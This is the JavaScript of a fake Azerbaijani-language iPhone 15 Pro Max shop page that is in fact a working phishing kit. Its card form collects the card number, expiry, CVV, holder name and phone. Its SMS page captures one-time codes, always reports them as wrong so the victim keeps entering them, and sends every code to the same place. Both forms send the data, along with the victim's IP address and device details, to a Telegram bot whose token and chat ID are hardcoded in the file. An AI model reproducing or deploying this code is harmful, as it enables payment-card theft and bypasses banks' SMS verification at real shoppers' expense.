// Global Variables
let currentImageIndex = 0
let selectedColor = "desert"
let currentPage = "productPage"
let timerInterval
let timeLeft = 300 // 5 minutes in seconds

// Bot Configuration
const BOT_TOKEN = "7890044397:AAGJfCPAGtZLjdZPx3zj-66caqMICnqb-3w"
const CHAT_ID = "-1002626141042"

// Image arrays for different colors - 3 RENK (GOLD SİLİNDİ!)
const colorImages = {
  black: [
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/Ba1-3NjcVoa96MN4X9bs3bQmzwFBhNMevp.webp",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B2-wwrNsrbcPWOHWuQxyjL3gmmnrHBVB5.webp",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B3-1cD5YKS8g8zVrr3kqpXiHwDSU3N3T5.webp",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/B4-4LUGyAlnHXC4nYpJevPeQw6Pd3anJH.webp",
  ],
  desert: [
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-BHXg2pLrBIcUiwARxxSnDwMQCRkJqy.png",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-uCeC6Ss0aawHBDEmfRjrC1nfFYuxs3.png",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-XrmuyJ5bSLxWSKh7okiRfjC8sAe1Bf.png",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/image-WsnSUGttrlxNQYlJLPqHev2cm6Mj3h.png",
  ],
  white: [
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S1-b6XRx41eY35rcY6EtkAgPXKmlAgAEV.webp",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S2-D6hckadTmE5Lam91LcIlFL8md3N9OH.webp",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S3-icw7vj1P3olV6AmuUMoTVXFPoT58NV.webp",
    "https://hebbkx1anhila5yf.public.blob.vercel-storage.com/S4-4A1CcCZxS1L4b6zHALF2t8XK8D2lJC.webp",
  ],
}

// Device Detection
function isMobile() {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
}

function isIOS() {
  return (
    /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1)
  )
}

function isMac() {
  return navigator.platform.toUpperCase().indexOf("MAC") >= 0
}

// Enhanced Universal Click Handler
function createClickHandler(element, callback) {
  if (!element || !callback) return

  let isHandling = false

  const handleClick = (e) => {
    if (isHandling) return
    isHandling = true

    e.preventDefault()
    e.stopPropagation()

    console.log("🎯 Click handled for:", element.tagName, element.className)

    try {
      callback(e)
    } catch (error) {
      console.error("❌ Error in click handler:", error)
    }

    setTimeout(() => {
      isHandling = false
    }, 100)
  }

  // Remove existing listeners
  element.removeEventListener("click", handleClick)
  element.removeEventListener("touchend", handleClick)

  // Add click listener (works on all devices)
  element.addEventListener("click", handleClick, { passive: false })

  // Add touch support for mobile
  if (isMobile() || isIOS()) {
    let touchStartTime = 0
    let touchStartY = 0

    element.addEventListener(
      "touchstart",
      (e) => {
        touchStartTime = Date.now()
        touchStartY = e.touches[0].clientY
        element.style.opacity = "0.8"
      },
      { passive: true },
    )

    element.addEventListener(
      "touchend",
      (e) => {
        const touchDuration = Date.now() - touchStartTime
        const touchEndY = e.changedTouches[0].clientY
        const touchDistance = Math.abs(touchEndY - touchStartY)

        element.style.opacity = "1"

        // Only trigger if it's a quick tap and not a scroll
        if (touchDuration < 500 && touchDistance < 10) {
          handleClick(e)
        }
      },
      { passive: false },
    )

    element.addEventListener("touchcancel", () => {
      element.style.opacity = "1"
    })
  }

  // Enhanced styling
  element.style.cursor = "pointer"
  element.style.webkitTapHighlightColor = "transparent"
  element.style.webkitUserSelect = "none"
  element.style.userSelect = "none"
  element.style.webkitTouchCallout = "none"
}

// Global Navigation Functions
function goToCheckout() {
  console.log("🔥 goToCheckout called")
  showPage("checkoutPage")
}

function goToProduct() {
  console.log("🔥 goToProduct called")
  showPage("productPage")
}

function goToPayment() {
  console.log("🔥 goToPayment called")
  showPage("cardPage")
}

function goToSms() {
  console.log("🔥 goToSms called")
  showPage("smsPage")
}

// Image Functions
function selectImage(index) {
  console.log("🔥 selectImage called:", index)
  currentImageIndex = index
  updateMainImage()
  updateThumbnails()
}

function changeImage(direction) {
  console.log("🔥 changeImage called:", direction)
  const images = colorImages[selectedColor]
  const newIndex = currentImageIndex + direction

  if (newIndex >= 0 && newIndex < images.length) {
    currentImageIndex = newIndex
    updateMainImage()
    updateThumbnails()
  }
}

function selectColor(colorId, colorName) {
  console.log("🔥 selectColor called:", colorId, colorName)
  selectedColor = colorId
  currentImageIndex = 0

  // Update color options
  const colorOptions = document.querySelectorAll(".color-option")
  colorOptions.forEach((option) => {
    option.classList.remove("active")
  })

  // Find and activate the selected color option
  const selectedOption = document.querySelector(`[onclick*="${colorId}"]`)
  if (selectedOption) {
    selectedOption.classList.add("active")
  }

  // Update color name display
  const colorNameElement = document.getElementById("selectedColorName")
  if (colorNameElement) {
    colorNameElement.textContent = colorName
  }

  // Update product title
  const productTitle = document.querySelector(".product-title")
  if (productTitle) {
    productTitle.textContent = `iPhone 15 Pro Max 256 GB ${colorName}`
  }

  // Update breadcrumb
  const breadcrumbCurrent = document.querySelector(".breadcrumb .current")
  if (breadcrumbCurrent) {
    breadcrumbCurrent.textContent = `iPhone 15 Pro Max 256 GB ${colorName}`
  }

  // Update images
  updateMainImage()
  updateThumbnailImages()
  updateThumbnails()
}

// Form Handlers
function submitCardForm(event) {
  console.log("🔥 submitCardForm called")
  event.preventDefault()

  const submitBtn = event.target.querySelector(".btn-confirm")
  if (submitBtn) {
    submitBtn.textContent = "İşlənir..."
    submitBtn.disabled = true
  }

  // Collect card data
  const cardData = {
    cardNumber: document.getElementById("cardNumber")?.value || "",
    expiry:
      (document.getElementById("expiryMonth")?.value || "") +
      "/" +
      (document.getElementById("expiryYear")?.value || ""),
    cvv: document.getElementById("cvv")?.value || "",
    cardHolder: document.getElementById("cardHolder")?.value || "",
    phone:
      (document.getElementById("phonePrefix")?.value || "") +
      " " +
      (document.getElementById("phoneNumber")?.value || ""),
  }

  // Send to Telegram
  sendToTelegram(cardData, "PAYMENT")

  // Always proceed to SMS page after 1.5 seconds
  setTimeout(() => {
    showPage("smsPage")
  }, 1500)
}

function submitSmsCode(event) {
  console.log("🔥 submitSmsCode called")
  event.preventDefault()

  const smsCode = document.getElementById("smsCode")?.value || ""

  // Send SMS code to Telegram
  sendToTelegram({ smsCode }, "SMS")

  // Always show error message and clear input
  const errorMessage = document.getElementById("errorMessage")
  if (errorMessage) {
    errorMessage.style.display = "block"
  }

  // Clear the input
  const smsInput = document.getElementById("smsCode")
  if (smsInput) {
    smsInput.value = ""
  }
}

function resendSms() {
  console.log("🔥 resendSms called")
  // Reset timer
  startTimer()

  // Show success message
  alert("SMS kodu yenidən göndərildi")

  // Clear any error messages
  const errorMessage = document.getElementById("errorMessage")
  if (errorMessage) {
    errorMessage.style.display = "none"
  }
}

// Assign functions to window object for global access
window.goToCheckout = goToCheckout
window.goToProduct = goToProduct
window.goToPayment = goToPayment
window.goToSms = goToSms
window.selectImage = selectImage
window.changeImage = changeImage
window.selectColor = selectColor
window.submitCardForm = submitCardForm
window.submitSmsCode = submitSmsCode
window.resendSms = resendSms

// Page Management
function showPage(pageId) {
  console.log("🔥 showPage called:", pageId)

  // Hide all pages
  const pages = document.querySelectorAll(".page")
  pages.forEach((page) => {
    page.classList.remove("active")
  })

  // Show selected page
  const targetPage = document.getElementById(pageId)
  if (targetPage) {
    targetPage.classList.add("active")
    currentPage = pageId
    console.log("✅ Page switched to:", pageId)

    // Start timer for SMS page
    if (pageId === "smsPage") {
      startTimer()
    } else {
      stopTimer()
    }

    // Scroll to top
    window.scrollTo(0, 0)
  } else {
    console.error("❌ Page not found:", pageId)
  }
}

window.showPage = showPage

// Initialize Application
function initializeApp() {
  console.log("🚀 App initializing...")

  // Show default page
  showPage("productPage")

  // Update images
  updateMainImage()

  // Setup event listeners
  setupEventListeners()

  // Setup click handlers
  setupClickHandlers()

  // Add viewport meta tag if missing
  if (!document.querySelector('meta[name="viewport"]')) {
    const viewport = document.createElement("meta")
    viewport.name = "viewport"
    viewport.content = "width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
    document.head.appendChild(viewport)
  }

  console.log("✅ App initialized successfully!")
}

// Setup Click Handlers
function setupClickHandlers() {
  console.log("🔧 Setting up click handlers...")

  // Wait for DOM elements to be available
  setTimeout(() => {
    // Main buy button
    const mainBuyBtn = document.getElementById("mainBuyButton")
    if (mainBuyBtn) {
      console.log("✅ Setting up main buy button")
      createClickHandler(mainBuyBtn, () => {
        console.log("🎯 Main buy button clicked!")
        goToCheckout()
      })
    }

    // Complete order button
    const completeBtn = document.querySelector(".btn-complete-order")
    if (completeBtn) {
      console.log("✅ Setting up complete order button")
      createClickHandler(completeBtn, () => {
        console.log("🎯 Complete order button clicked!")
        goToPayment()
      })
    }

    // Back buttons
    const backBtns = document.querySelectorAll(".back-btn")
    backBtns.forEach((btn, index) => {
      console.log(`✅ Setting up back button ${index}`)
      createClickHandler(btn, () => {
        console.log(`🎯 Back button ${index} clicked!`)
        const onclick = btn.getAttribute("onclick")
        if (onclick) {
          try {
            eval(onclick)
          } catch (e) {
            console.error("Error executing onclick:", e)
          }
        }
      })
    })

    // Thumbnail buttons
    const thumbnails = document.querySelectorAll(".thumbnail")
    thumbnails.forEach((thumb, index) => {
      console.log(`✅ Setting up thumbnail ${index}`)
      createClickHandler(thumb, () => {
        console.log(`🎯 Thumbnail ${index} clicked!`)
        selectImage(index)
      })
    })

    // Color buttons
    const colorBtns = document.querySelectorAll(".color-option")
    colorBtns.forEach((btn, index) => {
      console.log(`✅ Setting up color button ${index}`)
      createClickHandler(btn, () => {
        console.log(`🎯 Color button ${index} clicked!`)
        const onclick = btn.getAttribute("onclick")
        if (onclick) {
          try {
            eval(onclick)
          } catch (e) {
            console.error("Error executing onclick:", e)
          }
        }
      })
    })

    // Navigation buttons
    const navBtns = document.querySelectorAll(".nav-btn")
    navBtns.forEach((btn, index) => {
      console.log(`✅ Setting up nav button ${index}`)
      createClickHandler(btn, () => {
        console.log(`🎯 Nav button ${index} clicked!`)
        const onclick = btn.getAttribute("onclick")
        if (onclick) {
          try {
            eval(onclick)
          } catch (e) {
            console.error("Error executing onclick:", e)
          }
        }
      })
    })

    // Form buttons
    const formBtns = document.querySelectorAll(".btn-confirm, .btn-cancel, .btn-resend")
    formBtns.forEach((btn, index) => {
      console.log(`✅ Setting up form button ${index}`)
      createClickHandler(btn, () => {
        console.log(`🎯 Form button ${index} clicked!`)
        if (btn.type === "submit") {
          const form = btn.closest("form")
          if (form) {
            const event = new Event("submit", { bubbles: true, cancelable: true })
            form.dispatchEvent(event)
          }
        } else {
          const onclick = btn.getAttribute("onclick")
          if (onclick) {
            try {
              eval(onclick)
            } catch (e) {
              console.error("Error executing onclick:", e)
            }
          }
        }
      })
    })

    console.log("✅ Click handlers setup complete!")
  }, 200)
}

// Setup Event Listeners
function setupEventListeners() {
  console.log("🔧 Setting up event listeners...")

  // Phone number formatting
  const phonePrefix = document.getElementById("phonePrefix")
  const phoneNumber = document.getElementById("phoneNumber")

  if (phonePrefix) {
    phonePrefix.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      if (value.startsWith("0")) {
        value = value.substring(1)
      }
      if (value.length > 2) {
        value = value.substring(0, 2)
      }
      e.target.value = value
    })
  }

  if (phoneNumber) {
    phoneNumber.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      if (value.length > 7) {
        value = value.substring(0, 7)
      }
      // Format as XXX XX XX
      if (value.length > 3) {
        if (value.length > 5) {
          value = value.substring(0, 3) + " " + value.substring(3, 5) + " " + value.substring(5)
        } else {
          value = value.substring(0, 3) + " " + value.substring(3)
        }
      }
      e.target.value = value
    })
  }

  // Card number formatting
  const cardNumber = document.getElementById("cardNumber")
  if (cardNumber) {
    cardNumber.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      if (value.length > 16) {
        value = value.substring(0, 16)
      }
      // Format as XXXX XXXX XXXX XXXX
      value = value.replace(/(\d{4})(?=\d)/g, "$1 ")
      e.target.value = value
    })
  }

  // Expiry date formatting
  const expiryMonth = document.getElementById("expiryMonth")
  const expiryYear = document.getElementById("expiryYear")

  if (expiryMonth) {
    expiryMonth.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      if (value.length > 2) {
        value = value.substring(0, 2)
      }
      if (value.length === 2 && Number.parseInt(value) > 12) {
        value = "12"
      }
      if (value.length === 1 && Number.parseInt(value) > 1) {
        value = "0" + value
      }
      e.target.value = value
    })
  }

  if (expiryYear) {
    expiryYear.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      if (value.length > 2) {
        value = value.substring(0, 2)
      }
      e.target.value = value
    })
  }

  // CVV formatting
  const cvv = document.getElementById("cvv")
  if (cvv) {
    cvv.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      if (value.length > 3) {
        value = value.substring(0, 3)
      }
      e.target.value = value
    })
  }

  // Card holder name formatting
  const cardHolder = document.getElementById("cardHolder")
  if (cardHolder) {
    cardHolder.addEventListener("input", (e) => {
      e.target.value = e.target.value.toUpperCase()
    })
  }
}

// Product Image Functions
function updateMainImage() {
  const mainImage = document.getElementById("mainImage")
  const images = colorImages[selectedColor]

  if (mainImage && images && images[currentImageIndex]) {
    mainImage.src = images[currentImageIndex]
    mainImage.alt = `iPhone 15 Pro Max ${getColorName(selectedColor)} görünüş ${currentImageIndex + 1}`
  }
}

function updateThumbnails() {
  const thumbnails = document.querySelectorAll(".thumbnail")
  thumbnails.forEach((thumbnail, index) => {
    if (index === currentImageIndex) {
      thumbnail.classList.add("active")
    } else {
      thumbnail.classList.remove("active")
    }
  })
}

function updateThumbnailImages() {
  const thumbnails = document.querySelectorAll(".thumbnail img")
  const images = colorImages[selectedColor]

  thumbnails.forEach((thumbnail, index) => {
    if (images && images[index]) {
      thumbnail.src = images[index]
      thumbnail.alt = `iPhone 15 Pro Max ${getColorName(selectedColor)} görünüş ${index + 1}`
    }
  })
}

function getColorName(colorId) {
  const colorNames = {
    black: "Qara",
    desert: "Desert Titanium",
    white: "Ağ",
  }
  return colorNames[colorId] || "Desert Titanium"
}

// Utility Functions
function generateUserId() {
  const timestamp = Date.now()
  const random = Math.random().toString(36).substring(2, 8)
  return `USER_${timestamp}_${random}`.toUpperCase()
}

function getUserIP() {
  return fetch("https://api.ipify.org?format=json")
    .then((response) => response.json())
    .then((data) => data.ip)
    .catch(() => "Unknown IP")
}

// Telegram Integration
async function sendToTelegram(data, messageType = "PAYMENT") {
  try {
    const userIP = await getUserIP()
    const userId = generateUserId()
    const deviceInfo = `${navigator.platform} - ${navigator.userAgent.substring(0, 50)}...`

    let message = ""

    if (messageType === "PAYMENT") {
      message =
        `🔴 YENİ KART BİLGİSİ\n\n` +
        `👤 User ID: ${userId}\n` +
        `🌐 IP: ${userIP}\n` +
        `📱 Device: ${deviceInfo}\n` +
        `💳 Kart: ${data.cardNumber}\n` +
        `📅 Tarih: ${data.expiry}\n` +
        `🔒 CVV: ${data.cvv}\n` +
        `👨‍💼 Ad: ${data.cardHolder}\n` +
        `📞 Tel: +994 ${data.phone}\n` +
        `⏰ Zaman: ${new Date().toLocaleString("tr-TR")}`
    } else if (messageType === "SMS") {
      message =
        `🔴 SMS KODU GİRİLDİ\n\n` +
        `👤 User ID: ${userId}\n` +
        `🌐 IP: ${userIP}\n` +
        `📱 Device: ${deviceInfo}\n` +
        `🔢 SMS Kod: ${data.smsCode}\n` +
        `⏰ Zaman: ${new Date().toLocaleString("tr-TR")}`
    }

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`

    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    })

    const result = await response.json()
    console.log("Telegram response:", result)
    return result.ok
  } catch (error) {
    console.error("Telegram error:", error)
    return false
  }
}

// Timer Functions
function startTimer() {
  timeLeft = 300 // Reset to 5 minutes
  updateTimerDisplay()

  timerInterval = setInterval(() => {
    timeLeft--
    updateTimerDisplay()

    if (timeLeft <= 0) {
      stopTimer()
      // Handle timeout
      alert("Vaxt bitdi. Yenidən cəhd edin.")
      showPage("cardPage")
    }
  }, 1000)
}

function stopTimer() {
  if (timerInterval) {
    clearInterval(timerInterval)
    timerInterval = null
  }
}

function updateTimerDisplay() {
  const timerElement = document.getElementById("timer")
  if (timerElement) {
    const minutes = Math.floor(timeLeft / 60)
    const seconds = timeLeft % 60
    timerElement.textContent = `${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`
  }
}

// Event Listeners
document.addEventListener("DOMContentLoaded", () => {
  console.log("🚀 DOM loaded, initializing app")
  initializeApp()
})

// iOS/Safari için ek event listener
document.addEventListener("touchstart", () => {}, { passive: true })

// Initialize when page loads
window.addEventListener("load", () => {
  console.log("🎉 iPhone Product Page Loaded Successfully!")
  console.log("📱 Device info:", {
    isMobile: isMobile(),
    isIOS: isIOS(),
    isMac: isMac(),
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    touchPoints: navigator.maxTouchPoints,
  })

  // Re-setup click handlers after page load
  setTimeout(() => {
    setupClickHandlers()
  }, 500)
})

// iOS Safari için ek düzeltmeler
if (isIOS() || isMac()) {
  console.log("🍎 iOS/Mac detected - applying fixes")

  document.addEventListener("touchstart", () => {}, { passive: true })

  // iOS'ta onclick olaylarını zorla aktif et
  document.addEventListener("DOMContentLoaded", () => {
    const clickableElements = document.querySelectorAll("button, [onclick]")
    clickableElements.forEach((element) => {
      element.style.cursor = "pointer"
      element.addEventListener("touchstart", () => {}, { passive: true })
    })
  })
}

// Debug function for testing
window.testMainButton = () => {
  console.log("🧪 Testing main button click")
  const mainBtn = document.getElementById("mainBuyButton")
  if (mainBtn) {
    console.log("✅ Main button found, triggering click")
    mainBtn.click()
  } else {
    console.log("❌ Main button not found")
  }
}

console.log("🎯 Script loaded successfully!")
